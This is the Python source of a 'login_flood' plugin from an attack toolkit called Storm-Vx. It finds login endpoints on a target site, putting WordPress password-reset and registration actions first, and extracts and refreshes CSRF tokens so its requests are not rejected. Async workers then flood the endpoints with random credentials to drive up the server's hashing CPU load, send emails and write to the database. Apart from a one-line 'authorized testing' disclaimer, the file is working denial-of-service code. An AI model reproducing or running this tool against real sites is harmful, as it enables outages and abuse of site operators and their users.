#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_login_flood — Login Flood Attack Plugin (v24 P0)

Sends rapid POST requests with random credentials to login endpoints.
v24: Enhanced with smart login endpoint discovery, JSON API login support,
CSRF token extraction, and profile-driven targeting.

Key improvements:
- Discovers actual login endpoints from profile + HTML scraping
- Supports both form-encoded and JSON login formats
- Extracts CSRF tokens from login forms
- Targets the discovered endpoints instead of random pages
- This dramatically increases OK rate (real login endpoints = 200/302
  responses instead of 404s from random POST to non-login pages)

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
import re
import json
from typing import Dict, Any, List
from urllib.parse import urlencode, urlparse

import aiohttp


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin, ResponseClass
from vf_common import C, rand_user, rand_pass, rand_str
from utils.session_helpers import attack_timeout
from config.defaults import ATTACK_REQUEST_TIMEOUT, ATTACK_QUICK_TIMEOUT, CSRF_REFRESH_INTERVAL, CSRF_REFRESH_EVERY_N, DEFAULT_KEEPALIVE_TIMEOUT

from logging_config import get_logger
logger = get_logger(__name__)


__all__ = ["LoginFloodPlugin"]


# Common login endpoint patterns
# WordPress-specific paths listed FIRST for maximum priority
LOGIN_PATHS = [
    # WordPress (highest priority — bcrypt = CPU-heavy)
    "/wp-login.php",
    "/wp-login.php?action=lostpassword",  # Triggers email + CPU
    "/wp-login.php?action=register",      # DB write + email
    "/wp-login.php?action=resetpass",     # Password reset = bcrypt
    # Generic login paths
    "/login", "/signin", "/sign-in", "/auth/login", "/auth/signin",
    "/api/auth/login", "/api/login", "/api/signin", "/api/v1/auth/login",
    "/api/v1/login", "/api/v1/users/login", "/api/v1/auth/signin",
    "/account/login", "/user/login", "/users/login", "/users/sign_in",
    "/admin/login", "/administrator/login",
    "/oauth/token", "/token", "/auth/token",
    "/api/oauth/token", "/api/auth/token",
]

# Regex to extract login form fields
_FORM_RE = re.compile(r'<form[^>]*action=["\']([^"\']+)["\']', re.IGNORECASE)
_INPUT_RE = re.compile(r'<input[^>]*name=["\']([^"\']+)["\']', re.IGNORECASE)
_CSRF_RE = re.compile(r'<input[^>]*name=["\']((?:csrf|token|_token|authenticity_token|_csrf)[^"\']*)["\'][^>]*value=["\']([^"\']+)["\']', re.IGNORECASE)


class LoginFloodPlugin(AttackPlugin):
    """Flood login endpoints with random credentials (v24: smart targeting).

    v24: Discovers actual login endpoints from the profile and HTML,
    extracts CSRF tokens, and supports JSON API login. Instead of
    POSTing random pages (which returns 404), we target actual login
    forms for maximum server-side processing (bcrypt/scrypt hashing).
    """

    meta = PluginMeta(
        name='login_flood',
        version='2.0.0',
        plugin_type='attack',
        description='Login flood — smart targeting of login endpoints with CSRF token support',
        tags=['http', 'login', 'auth', 'flood', 'cpu-burn', 'smart'],
        priority=20,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    def __init__(self) -> None:
        super().__init__()
        self._discovered_login_urls: List[str] = []
        self._login_format: str = "form"  # "form" or "json"
        self._csrf_token_name: str = ""
        self._csrf_token_value: str = ""  # BUG-012: Store actual extracted CSRF token value
        self._csrf_refresh_after: float = 0.0  # Timestamp after which token should be refreshed
        self._csrf_refresh_interval: float = CSRF_REFRESH_INTERVAL  # W2.4: Refresh token every N seconds
        self._csrf_request_count: int = 0  # Track requests since last refresh
        self._csrf_refresh_every_n: int = CSRF_REFRESH_EVERY_N  # W2.4: Also refresh every N requests
        # BUG-FIX v33: Use asyncio.Event instead of bool for proper worker
        # synchronization. With bool, workers 1+ see _probe_done=True but
        # _discovered_login_urls is still empty (worker 0 hasn't finished),
        # so they fall back to generic pages for the entire attack duration.
        self._probe_done: asyncio.Event = asyncio.Event()

    async def _discover_login_endpoints(self, context: AttackContext) -> List[str]:
        """v24: Discover actual login endpoints from HTML and probing.

        Returns list of URLs that are likely login endpoints.
        """
        _ssl = context.ssl_param

        discovered: List[str] = []
        site_root = context.site_root
        pages = context.page_targets or [context.url]

        # Phase 1: Check profile for known login endpoints
        profile = context.profile
        api_endpoints = profile.api_endpoints if profile else []
        login_fields = profile.login_fields if profile else {}
        if login_fields:
            # Profile has login field info — there must be a login endpoint
            login_url = login_fields.get("url", "")
            if login_url:
                if login_url.startswith('/'):
                    login_url = f"{site_root}{login_url}"
                discovered.append(login_url)

        # Phase 2: Extract login forms from HTML
        for page in pages[:2]:
            try:
                headers = dict(context.headers)
                async with context.session.get(page, headers=headers,
                                               ssl=_ssl, allow_redirects=True,
                                               timeout=attack_timeout(total=ATTACK_REQUEST_TIMEOUT)) as resp:  # W2.4
                    if resp.status == 200:
                        html = await resp.text(errors='ignore')
                        # Look for login forms
                        for match in _FORM_RE.findall(html):
                            if any(kw in match.lower() for kw in ['login', 'signin', 'sign-in', 'auth', 'session']):
                                if match.startswith('/'):
                                    match = f"{site_root}{match}"
                                discovered.append(match)

                        # Look for CSRF tokens — BUG-012: extract both name AND value
                        csrf_match = _CSRF_RE.search(html)
                        if csrf_match:
                            self._csrf_token_name = csrf_match.group(1)
                            self._csrf_token_value = csrf_match.group(2)
                            self._csrf_refresh_after = time.time() + self._csrf_refresh_interval
                            self._csrf_request_count = 0
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                logger.debug(f"Login endpoint discovery failed for {page}: {exc}")

        # Phase 3: Probe common login paths
        for path in random.sample(LOGIN_PATHS, min(10, len(LOGIN_PATHS))):
            url = f"{site_root}{path}"
            try:
                headers = dict(context.headers)
                async with context.session.get(url, headers=headers,
                                               ssl=_ssl, allow_redirects=False,
                                               timeout=attack_timeout(total=ATTACK_QUICK_TIMEOUT)) as resp:  # W2.4
                    # 200 = login page exists, 401/403 = API endpoint exists
                    if resp.status in (200, 401, 403):
                        discovered.append(url)
                        # Check if it's a JSON API (returns JSON on GET)
                        ct = resp.headers.get('Content-Type', '')
                        if 'json' in ct.lower():
                            self._login_format = "json"
                    elif resp.status in (301, 302, 307, 308):
                        location = resp.headers.get('Location', '')
                        if any(kw in location.lower() for kw in ['login', 'signin', 'auth']):
                            if location.startswith('/'):
                                location = f"{site_root}{location}"
                            discovered.append(location)
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                logger.debug(f"Login path probe failed for {url}: {exc}")

        # Fallback: use base pages if nothing found
        if not discovered:
            discovered = pages
            print(f"  {C.Y}[LOGIN-FLOOD] No login endpoints found, using base pages{C.RS}")
        else:
            # Deduplicate
            discovered = list(dict.fromkeys(discovered))
            print(f"  {C.G}[LOGIN-FLOOD] Discovered {len(discovered)} login endpoints (format: {self._login_format}){C.RS}")

        return discovered

    async def _refresh_csrf_token(self, context: AttackContext) -> None:
        """BUG-012: Re-fetch the login page and extract fresh CSRF token name+value.

        CSRF tokens expire over time. This method re-fetches the login page
        to get a fresh token, ensuring servers that validate CSRF tokens
        don't reject our requests with stale tokens.
        """
        _ssl = context.ssl_param

        targets = self._discovered_login_urls or context.page_targets or [context.url]
        # Pick the first target that looks like a login page
        login_url = targets[0] if targets else context.url

        try:
            headers = dict(context.headers)
            async with context.session.get(login_url, headers=headers,
                                           ssl=_ssl, allow_redirects=True,
                                           timeout=attack_timeout(total=ATTACK_REQUEST_TIMEOUT)) as resp:  # W2.4
                if resp.status == 200:
                    html = await resp.text(errors='ignore')
                    csrf_match = _CSRF_RE.search(html)
                    if csrf_match:
                        self._csrf_token_name = csrf_match.group(1)
                        self._csrf_token_value = csrf_match.group(2)
                        self._csrf_refresh_after = time.time() + self._csrf_refresh_interval
                        self._csrf_request_count = 0
                    else:
                        # Token no longer in page — keep existing value, just extend timer
                        self._csrf_refresh_after = time.time() + self._csrf_refresh_interval
                        self._csrf_request_count = 0
        except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
            # Refresh failed — keep existing token, try again later
            logger.debug(f"CSRF token refresh failed: {exc}")
            self._csrf_refresh_after = time.time() + 30.0  # Retry in 30s

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """Login flood worker: POST with random credentials to discovered login endpoints."""
        _ssl = context.ssl_param

        pages = context.page_targets or [context.url]
        username_field = context.extra.username_field
        password_field = context.extra.password_field
        delay_ms = context.extra.delay_ms

        # BUG-FIX v33: Use asyncio.Event.wait() for proper synchronization.
        # Worker 0 discovers endpoints and sets the event. Other workers
        # await the event so they wait until discovery is complete.
        if worker_id == 0 and not self._probe_done.is_set():
            self._discovered_login_urls = await self._discover_login_endpoints(context)
            self._probe_done.set()
        elif not self._probe_done.is_set():
            try:
                await asyncio.wait_for(self._probe_done.wait(), timeout=DEFAULT_KEEPALIVE_TIMEOUT)  # W2.4
            except asyncio.TimeoutError:
                logger.warning(f"Worker {worker_id}: login discovery timeout, using base pages")

        targets = self._discovered_login_urls if self._discovered_login_urls else pages

        # BUG-012: Initial CSRF token refresh
        if self._csrf_token_name and not self._csrf_token_value:
            await self._refresh_csrf_token(context)

        while not self._stop_event.is_set():
            try:
                url = random.choice(targets)

                # v24: Get fresh headers with login-specific fingerprint
                headers = self._get_fresh_headers(context, "login")

                username = rand_user()
                password = rand_pass()

                # v24: Choose between form-encoded and JSON login
                if self._login_format == "json":
                    headers["Content-Type"] = "application/json"
                    payload = json.dumps({
                        username_field: username,
                        password_field: password,
                        "remember": random.choice([True, False]),
                        "device_id": rand_str(16),
                    })
                else:
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    data = {
                        username_field: username,
                        password_field: password,
                    }
                    # BUG-012: Add CSRF token if found — use extracted VALUE, not random
                    if self._csrf_token_name:
                        data[self._csrf_token_name] = self._csrf_token_value or rand_str(32)
                        # Track requests and refresh token periodically
                        self._csrf_request_count += 1
                    payload = urlencode(data)

                t = time.time()
                try:
                    async with context.session.post(url, headers=headers,
                                                    data=payload,
                                                    ssl=_ssl, allow_redirects=False) as resp:
                        rt = time.time() - t
                        resp_headers = dict(resp.headers)
                        response_class = self._process_response(resp.status, resp_headers, url=url[:60], worker_id=worker_id)
                        ok = response_class in (ResponseClass.OK, ResponseClass.AUTH_REQUIRED, ResponseClass.REDIRECT)
                        self._capture_response_cookies(resp, context)
                        await self._record("LOGIN", ok, resp.status, rt, url=url[:60])
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.time() - t
                    self._on_request_result(worker_id, False)
                    await self._record("LOGIN", False, 0, rt,
                                       err=type(exc).__name__, url=url[:60])

                # BUG-012: Refresh CSRF token periodically (time-based or count-based)
                if (self._csrf_token_name
                        and (time.time() > self._csrf_refresh_after
                             or self._csrf_request_count >= self._csrf_refresh_every_n)):
                    await self._refresh_csrf_token(context)

                # v24: Adaptive sleep with backoff
                await self._adaptive_sleep(worker_id, delay_ms)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                self._on_request_result(worker_id, False)
                await self._record("LOGIN", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)


